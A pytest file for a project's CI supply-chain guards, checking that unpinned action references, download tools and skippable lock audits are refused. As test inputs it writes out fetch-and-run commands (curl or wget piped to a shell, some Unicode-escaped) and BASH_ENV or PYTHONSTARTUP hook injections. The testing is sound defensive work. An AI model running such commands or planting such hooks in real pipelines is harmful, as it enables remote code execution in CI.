# Copyright 2026 Ori Nexus Systems LTD
# SPDX-License-Identifier: Apache-2.0

"""The supply-chain guards refuse by allow-list and fail closed.

A `uses:` passes only as a full commit SHA, a `./` path or a `docker://` image
pinned by digest, whatever its spelling; a download tool in CI is refused; and
every job waits on the lock audit; and the audit fails on any OSV record but a
RustSec unmaintained-crate notice, and on any answer it cannot read.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import audit_locks as locks  # noqa: E402
import check_workflows as guard  # noqa: E402

SHA = "0123456789abcdef0123456789abcdef01234567"
DIGEST = "sha256:" + "a" * 64


def _refused(text: str) -> list[str]:
    failures: list[str] = []
    guard._check_references(Path("w.yml"), text, failures)
    return failures


def _step(uses: str) -> str:
    return f"on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: {uses}\n"


@pytest.mark.parametrize(
    "uses",
    [
        "actions/checkout@v4",
        "actions/checkout@v4.1.1",
        "actions/checkout@main",
        "actions/checkout@master",
        "actions/checkout@develop",
        "actions/checkout@release-1.0",
        "actions/checkout@feature/x",
        "actions/checkout@a1b2c3d",
        "actions/checkout@latest",
        "actions/checkout@mainline",
        "actions/checkout@" + SHA.upper(),
        "actions/checkout@" + SHA[:-1],
        "actions/checkout",
        "docker://alpine:3.20",
        "docker://alpine@sha256:abc",
        "'actions/checkout@main'",
        '"actions/checkout@main"',
        "actions/checkout@" + SHA + "x",
    ],
)
def test_an_unpinned_step_is_refused_however_it_is_spelled(uses: str) -> None:
    assert _refused(_step(uses))


@pytest.mark.parametrize(
    "uses",
    [
        "actions/checkout@" + SHA,
        f"actions/checkout@{SHA} # v4.1.1",
        "github/codeql-action/init@" + SHA,
        "./.github/actions/changed-paths",
        "docker://alpine@" + DIGEST,
    ],
)
def test_a_pinned_reference_passes(uses: str) -> None:
    assert _refused(_step(uses)) == []


def test_a_flow_mapping_and_a_reusable_workflow_are_read_as_parsed() -> None:
    flow = "on: push\njobs:\n  j:\n    runs-on: x\n    steps: [{uses: a/b@main}]\n"
    reusable = (
        "on: push\njobs:\n  j:\n    uses: org/repo/.github/workflows/y.yml@main\n"
    )
    assert _refused(flow)
    assert _refused(reusable)


def test_a_reference_that_is_not_a_string_is_refused() -> None:
    assert _refused("on: push\njobs:\n  j:\n    steps:\n      - uses: [a/b]\n")


@pytest.mark.parametrize(
    "run",
    ["curl -o f https://x.test/s.sh; bash f", "wget https://x.test/s", "iwr x"],
)
def test_a_download_tool_is_refused_with_its_limit(run: str) -> None:
    failures = _refused(f"on: push\njobs:\n  j:\n    steps:\n      - run: {run}\n")
    assert failures and "review boundary" in failures[0]


def test_the_shipped_workflows_and_actions_pass(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.chdir(ROOT)
    assert guard.main() == 0


def test_a_composite_action_is_held_to_the_same_rule(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    action = tmp_path / ".github" / "actions" / "a" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n"
    )
    monkeypatch.chdir(tmp_path)
    assert guard.main() == 1


def test_a_key_spelled_in_another_case_is_still_a_reference() -> None:
    assert _refused("on: push\njobs:\n  j:\n    steps:\n      - Uses: a/b@main\n")


def test_a_key_a_mapping_cannot_hold_is_refused_not_raised() -> None:
    assert _refused("on: push\n? [uses]\n: a/b@main\n")


def test_an_escaped_download_tool_is_refused(tmp_path: Path) -> None:
    for tool in ("c\\u0075rl", "w\\u0067et", "\\u0069wr", "Invoke-WebR\\u0065quest"):
        text = f'on: push\njobs:\n  j:\n    steps:\n      - run: "{tool} x | sh"\n'
        assert _refused(text), tool


def test_an_escaped_download_in_a_composite_action_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    action = tmp_path / ".github" / "actions" / "a" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text(
        'runs:\n  using: composite\n  steps:\n    - run: "c\\u0075rl x | sh"\n'
    )
    monkeypatch.chdir(tmp_path)
    assert guard.main() == 1


AUDIT = (
    "  audit:\n    runs-on: ubuntu-latest\n    steps:\n"
    f"      - uses: step-security/harden-runner@{SHA}\n"
    f"      - uses: actions/checkout@{SHA}\n"
    "        with:\n          persist-credentials: false\n"
    "      - run: python3 scripts/audit_locks.py\n"
)


def _jobs_refused(name: str, jobs: str) -> list[str]:
    failures: list[str] = []
    guard._check_audit_first(
        Path(name), guard._load_workflow("on: push\njobs:\n" + jobs), failures
    )
    return failures


def test_a_job_that_does_not_wait_on_the_audit_is_refused() -> None:
    assert _jobs_refused("ci.yml", AUDIT + "  build:\n    runs-on: x\n")
    assert _jobs_refused("ci.yml", "  build:\n    runs-on: x\n")


def test_waiting_through_another_job_is_waiting() -> None:
    jobs = (
        AUDIT
        + "  pre:\n    needs: audit\n    runs-on: x\n"
        + "  build:\n    needs: [pre]\n    runs-on: x\n"
    )
    assert _jobs_refused("ci.yml", jobs) == []


def test_an_audit_job_that_runs_after_something_is_refused() -> None:
    waits = AUDIT.replace(
        "    runs-on: ubuntu-latest\n", "    needs: pre\n    runs-on: ubuntu-latest\n"
    )
    assert _jobs_refused("ci.yml", waits + "  pre:\n    runs-on: x\n")
    # The same jobs, with the audit first: only the audit's `needs` was wrong.
    rest = "  pre:\n    needs: audit\n    runs-on: x\n"
    assert _jobs_refused("ci.yml", AUDIT + rest) == []
    assert _jobs_refused("ci.yml", waits + rest)


@pytest.mark.parametrize("name", ["codeql.yml", "pr-title.yml", "release.yml"])
def test_no_job_is_exempt_from_waiting(name: str) -> None:
    assert _jobs_refused(name, AUDIT + "  analyze:\n    runs-on: x\n")


AUDITED_IF = (
    "always() && needs.audit.result == 'success' && (needs.a.result == 'failure')"
)


@pytest.mark.parametrize(
    ("needs", "condition", "allowed"),
    [
        ("[audit, a]", AUDITED_IF, True),
        (
            "[audit, a]",
            "always()\n  && needs.audit.result == 'success'\n  && (x || y)",
            True,
        ),
        ("[a]", AUDITED_IF, False),
        ("[audit, a]", "always()", False),
        ("[audit, a]", "always() || needs.audit.result == 'success' && (x)", False),
        ("[audit, a]", AUDITED_IF + " || true", False),
        (
            "[audit, a]",
            "always() && needs.audit.result == 'success' && (x) || (y)",
            False,
        ),
        ("[audit, a]", "Always() && needs.audit.result != 'success' && (x)", False),
        (
            "[audit, a]",
            "always() && needs.audit.result == 'success' && "
            "( github.ref == '(' ) || always() || ( github.ref == ')' )",
            False,
        ),
        (
            "[audit, a]",
            "always() && needs.audit.result == 'success' && (x == ')')",
            True,
        ),
        (
            "[audit, a]",
            "always() && needs.audit.result == 'success' && ( ${{ always() }} )",
            False,
        ),
        (
            "[audit, a]",
            "${{ always() && needs.audit.result == 'success' && (x) }}",
            False,
        ),
    ],
)
def test_a_status_function_is_allowed_only_behind_the_audits_success(
    needs: str, condition: str, allowed: bool
) -> None:
    jobs = (
        AUDIT
        + "  a:\n    needs: audit\n    runs-on: x\n"
        + f"  incident:\n    needs: {needs}\n    if: {json.dumps(condition)}\n"
        + "    runs-on: x\n"
    )
    assert (_jobs_refused("release.yml", jobs) == []) is allowed


LOCK = """version = 4

[[package]]
name = "arrayref"
version = "0.3.9"
source = "registry+https://github.com/rust-lang/crates.io-index"

[[package]]
name = "ori-runtime-mobile"
version = "0.1.0"

[[package]]
name = "forked"
version = "1.0.0"
source = "git+https://example.test/forked#abc"

[[package]]
name = "unsafe-libyaml"
version = "0.2.11"
source = "registry+https://github.com/rust-lang/crates.io-index"
"""

PIP_LOCK = """#
# pip-compile output
#
certifi==2026.1.1 \\
    --hash=sha256:aaaa
Zope.Interface==7.0 \\
    --hash=sha256:bbbb
uvicorn[standard]==0.30.0 ; python_version >= "3.11" \\
    --hash=sha256:cccc
"""


def test_a_python_lock_is_read_as_normalized_exact_pins() -> None:
    assert locks.python_pins(PIP_LOCK) == [
        ("PyPI", "certifi", "2026.1.1"),
        ("PyPI", "zope-interface", "7.0"),
        ("PyPI", "uvicorn", "0.30.0"),
    ]


@pytest.mark.parametrize("lock", ["requests>=2\n", "-r other.txt\n", "# only\n", ""])
def test_a_python_lock_the_audit_cannot_cover_fails_it(lock: str) -> None:
    with pytest.raises(ValueError):
        locks.python_pins(lock)


def test_every_shipped_lock_is_read(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(ROOT)
    ecosystems = {e for e, _n, _v in locks.shipped_packages()}
    assert ecosystems == {"PyPI", "crates.io"}
    assert len(locks.PYTHON_LOCKS) == len(list((ROOT / "requirements").glob("*.txt")))


def _osv(records: dict[str, list[str]], details: dict[str, dict[str, object]]):
    def fetch(url: str, body: bytes | None) -> bytes:
        if body is not None:
            queries = json.loads(body)["queries"]
            return json.dumps(
                {
                    "results": [
                        {"vulns": [{"id": i} for i in records[q["package"]["name"]]]}
                        if q["package"]["name"] in records
                        else {}
                        for q in queries
                    ]
                }
            ).encode()
        return json.dumps(details[url.rsplit("/", 1)[1]]).encode()

    return fetch


def _unmaintained(record_id: str, ecosystem: str = "crates.io") -> dict[str, object]:
    return {
        "id": record_id,
        "summary": "unmaintained",
        "affected": [
            {
                "package": {"ecosystem": ecosystem},
                "database_specific": {"informational": "unmaintained"},
            }
        ],
    }


def test_only_crates_io_packages_are_audited() -> None:
    assert locks.locked_crates(LOCK) == [
        ("crates.io", "arrayref", "0.3.9"),
        ("crates.io", "unsafe-libyaml", "0.2.11"),
    ]


def test_a_malicious_record_fails_and_an_unmaintained_notice_does_not() -> None:
    fetch = _osv(
        {"arrayref": ["MAL-2026-1"], "unsafe-libyaml": ["RUSTSEC-2024-0449"]},
        {
            "MAL-2026-1": {"id": "MAL-2026-1", "summary": "malicious", "affected": []},
            "RUSTSEC-2024-0449": _unmaintained("RUSTSEC-2024-0449"),
        },
    )
    failing, notices = locks.audit(locks.locked_crates(LOCK), fetch)
    assert failing == ["crates.io arrayref 0.3.9: MAL-2026-1 malicious"]
    assert notices == [
        "crates.io unsafe-libyaml 0.2.11: RUSTSEC-2024-0449 unmaintained"
    ]


@pytest.mark.parametrize(
    ("record_id", "record", "ecosystem"),
    [
        ("MAL-2026-2", _unmaintained("MAL-2026-2"), "crates.io"),
        ("RUSTSEC-1", _unmaintained("RUSTSEC-1", "PyPI"), "crates.io"),
        ("RUSTSEC-2", {**_unmaintained("RUSTSEC-2"), "affected": []}, "crates.io"),
        (
            "RUSTSEC-3",
            {
                **_unmaintained("RUSTSEC-3"),
                "affected": [*_unmaintained("RUSTSEC-3")["affected"], {}],  # type: ignore[list-item]
            },
            "crates.io",
        ),
        ("RUSTSEC-4", _unmaintained("RUSTSEC-4"), "PyPI"),
    ],
)
def test_only_a_rustsec_unmaintained_crate_notice_passes(
    record_id: str, record: dict[str, object], ecosystem: str
) -> None:
    fetch = _osv({"pkg": [record_id]}, {record_id: record})
    failing, notices = locks.audit([(ecosystem, "pkg", "1.0")], fetch)
    assert failing and notices == []


@pytest.mark.parametrize(
    "answer",
    [
        {"results": []},
        {"results": [{"vulns": [], "next_page_token": "t"}]},
        {"results": [{"vulns": {}}]},
        {"results": [{"vulns": False}]},
        {"results": [{"vulns": 0}]},
        {"results": [{"vulns": ""}]},
        {"results": [{"vulns": [{}]}]},
        {"results": [{"vulns": [{"id": ""}]}]},
        {"results": [[]]},
        {"results": None},
        {"nothing": True},
        [],
    ],
)
def test_an_answer_the_audit_cannot_read_fails_it(answer: object) -> None:
    with pytest.raises(ValueError):
        locks.audit(
            [("crates.io", "arrayref", "0.3.9")],
            lambda _url, _body: json.dumps(answer).encode(),
        )


def test_a_record_that_is_not_the_one_asked_for_fails_the_audit() -> None:
    fetch = _osv({"arrayref": ["RUSTSEC-9"]}, {"RUSTSEC-9": _unmaintained("RUSTSEC-8")})
    with pytest.raises(ValueError):
        locks.audit([("crates.io", "arrayref", "0.3.9")], fetch)


def test_the_sparse_index_is_crates_io_too() -> None:
    lock = LOCK.replace(
        'source = "registry+https://github.com/rust-lang/crates.io-index"',
        'source = "sparse+https://index.crates.io/"',
    )
    assert locks.locked_crates(lock) == locks.locked_crates(LOCK)


@pytest.mark.parametrize(
    "lock",
    [
        LOCK.replace(
            "registry+https://github.com/rust-lang/crates.io-index",
            "registry+https://other.test/index",
            1,
        ),
        '[[package]]\nname = "ori-runtime-mobile"\nversion = "0.1.0"\n',
        "",
    ],
)
def test_a_cargo_lock_the_audit_cannot_cover_fails_it(lock: str) -> None:
    with pytest.raises(ValueError):
        locks.locked_crates(lock)


def test_an_outage_fails_the_audit(monkeypatch: pytest.MonkeyPatch) -> None:
    def down(_url: str, _body: bytes | None) -> bytes:
        raise OSError("unreachable")

    monkeypatch.chdir(ROOT)
    monkeypatch.setattr(locks.audit, "__defaults__", (down,))
    assert locks.main() == 1


def test_an_audit_job_that_runs_something_else_is_refused() -> None:
    jobs = AUDIT.replace("python3 scripts/audit_locks.py", "echo audited")
    assert _jobs_refused(
        "ci.yml", jobs + "  build:\n    needs: audit\n    runs-on: x\n"
    )


def test_a_line_beside_the_pins_that_is_not_a_pin_fails_the_lock() -> None:
    with pytest.raises(ValueError):
        locks.python_pins(PIP_LOCK + "requests>=2\n")


HARDEN = "step-security/harden-runner@" + SHA
CHECKOUT = "actions/checkout@" + SHA


def _workflow(audit_extra: str = "", step_extra: str = "", build_if: str = "") -> str:
    """A workflow whose audit job is exact, with one alteration spliced in."""
    return (
        "on: push\n"
        "permissions:\n  contents: read\n"
        "jobs:\n"
        "  audit:\n"
        "    runs-on: ubuntu-latest\n"
        f"{audit_extra}"
        "    permissions:\n      contents: read\n"
        "    steps:\n"
        f"      - uses: {HARDEN}\n        with:\n          egress-policy: audit\n"
        f"      - uses: {CHECKOUT}\n        with:\n          persist-credentials: false\n"
        f"      - run: python3 scripts/audit_locks.py\n{step_extra}"
        "  build:\n"
        "    needs: audit\n"
        f"{build_if}"
        "    runs-on: x\n"
    )


def _main_on(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str) -> int:
    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(text)
    monkeypatch.chdir(tmp_path)
    return guard.main()


def test_the_exact_audit_job_passes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    assert _main_on(tmp_path, monkeypatch, _workflow()) == 0


@pytest.mark.parametrize(
    "text",
    [
        _workflow(step_extra="        continue-on-error: true\n"),
        _workflow(step_extra="        if: false\n"),
        _workflow(audit_extra="    if: false\n"),
        _workflow(audit_extra="    continue-on-error: true\n"),
        _workflow(audit_extra="    strategy:\n      matrix:\n        a: [1]\n"),
        _workflow(build_if="    if: always()\n"),
        _workflow(build_if="    if: ${{ !cancelled() }}\n"),
        _workflow(build_if="    if: failure()\n"),
        _workflow(build_if="    if: success() || true\n"),
        _workflow(step_extra="      - run: pip install -r requirements/dev.txt\n"),
        _workflow().replace("persist-credentials: false", "persist-credentials: true"),
        _workflow().replace(
            "          persist-credentials: false\n",
            "          persist-credentials: false\n          ref: other\n",
        ),
        _workflow().replace(
            "        with:\n          persist-credentials: false\n", ""
        ),
        _workflow().replace(
            "python3 scripts/audit_locks.py",
            "python3 scripts/audit_locks.py || true",
        ),
    ],
)
def test_an_audit_that_can_be_skipped_or_ignored_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str
) -> None:
    assert _main_on(tmp_path, monkeypatch, text) == 1


@pytest.mark.parametrize("pin", ["x==1.26.*", "x===1.0", "x==1.0*"])
def test_a_specifier_that_is_not_one_release_is_refused(pin: str) -> None:
    with pytest.raises(ValueError):
        locks.python_pins(pin + "\n")


def test_the_local_run_audits_before_it_installs() -> None:
    script = (ROOT / "scripts" / "ci_local.sh").read_text()
    audit = script.index("python3 scripts/audit_locks.py")
    assert audit < script.index("pip install")


@pytest.mark.parametrize(
    "inherited",
    [
        "defaults:\n  run:\n    shell: bash -c 'exit 0' {0}\n",
        "defaults:\n  run:\n    working-directory: elsewhere\n",
        "env:\n  BASH_ENV: ./hook.sh\n",
        "env:\n  PATH: ./bin\n",
        "env:\n  PYTHONSTARTUP: ./hook.py\n",
        "env:\n  ori_lower: x\n",
        "env: x\n",
        "container: alpine\n",
    ],
)
def test_a_workflow_setting_the_audit_inherits_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, inherited: str
) -> None:
    text = _workflow().replace("jobs:\n", inherited + "jobs:\n", 1)
    assert _main_on(tmp_path, monkeypatch, text) == 1


def test_the_projects_own_workflow_env_passes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    text = _workflow().replace(
        "jobs:\n", "env:\n  ORI_ANDROID_API_LEVEL: '21'\njobs:\n", 1
    )
    assert _main_on(tmp_path, monkeypatch, text) == 0


@pytest.mark.parametrize(
    "jobs_extra",
    [
        "    container: python:3.12\n",
        "    services:\n      r:\n        image: redis:latest\n",
    ],
)
def test_a_container_image_on_a_job_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, jobs_extra: str
) -> None:
    text = _workflow(build_if=jobs_extra)
    assert _main_on(tmp_path, monkeypatch, text) == 1


def test_a_docker_action_image_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    action = tmp_path / ".github" / "actions" / "a" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text("runs:\n  using: docker\n  image: docker://alpine:latest\n")
    monkeypatch.chdir(tmp_path)
    assert guard.main() == 1


def test_a_download_tool_in_a_comment_is_refused() -> None:
    assert _refused("on: push\n# curl https://x | sh\njobs: {}\n")


def test_an_escaped_download_tool_as_a_key_is_refused() -> None:
    assert _refused('on: push\njobs:\n  j:\n    with:\n      "c\\u0075rl": x\n')


@pytest.mark.parametrize("case", ["Always()", "ALWAYS()", "Failure()"])
def test_a_status_function_in_any_case_is_refused(case: str) -> None:
    jobs = AUDIT + f"  build:\n    needs: audit\n    if: {case}\n    runs-on: x\n"
    assert _jobs_refused("ci.yml", jobs)


@pytest.mark.parametrize(
    "option",
    [
        "        shell: bash -c 'exit 0' {0}\n",
        "        env:\n          BASH_ENV: ./hook.sh\n",
        "        working-directory: elsewhere\n",
    ],
)
def test_the_audit_step_takes_no_execution_option(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, option: str
) -> None:
    assert _main_on(tmp_path, monkeypatch, _workflow(step_extra=option)) == 1


def test_the_first_audit_step_must_be_the_runner_hardening(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    text = _workflow().replace(HARDEN, "evil/action@" + SHA)
    assert _main_on(tmp_path, monkeypatch, text) == 1


def test_the_local_run_stops_when_the_audit_fails() -> None:
    script = (ROOT / "scripts" / "ci_local.sh").read_text()
    (line,) = [
        line for line in script.splitlines() if "python3 scripts/audit_locks.py" in line
    ]
    assert "|| {" in line and line.rstrip().endswith("exit 1; }")


def test_every_shipped_pin_is_audited(monkeypatch: pytest.MonkeyPatch) -> None:
    """Counted here without the audit's own parser."""
    monkeypatch.chdir(ROOT)
    expected = set()
    for lock in sorted((ROOT / "requirements").glob("*.txt")):
        for line in lock.read_text().splitlines():
            if line and not line[0].isspace() and not line.startswith("#"):
                name, _, rest = line.partition("==")
                version = rest.split()[0].split(";")[0]
                expected.add(
                    (
                        "PyPI",
                        name.split("[")[0].lower().replace("_", "-").replace(".", "-"),
                        version,
                    )
                )
    cargo = (ROOT / "mobile" / "ori-runtime-mobile" / "Cargo.lock").read_text()
    for block in cargo.split("[[package]]")[1:]:
        fields = dict(
            line.split(" = ", 1) for line in block.strip().splitlines() if " = " in line
        )
        if fields.get("source", "").startswith('"registry+'):
            expected.add(
                ("crates.io", fields["name"].strip('"'), fields["version"].strip('"'))
            )
    assert set(locks.shipped_packages()) == expected


@pytest.mark.parametrize(
    ("runner", "allowed"),
    [
        ("ubuntu-latest", True),
        ("ubuntu-24.04", True),
        ("self-hosted", False),
        ("[self-hosted, linux]", False),
        ("windows-latest", False),
        ("ubuntu-latest-arm", False),
    ],
)
def test_the_audit_runs_only_on_a_hosted_ubuntu_image(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, runner: str, allowed: bool
) -> None:
    text = _workflow().replace("runs-on: ubuntu-latest", f"runs-on: {runner}", 1)
    assert (_main_on(tmp_path, monkeypatch, text) == 0) is allowed
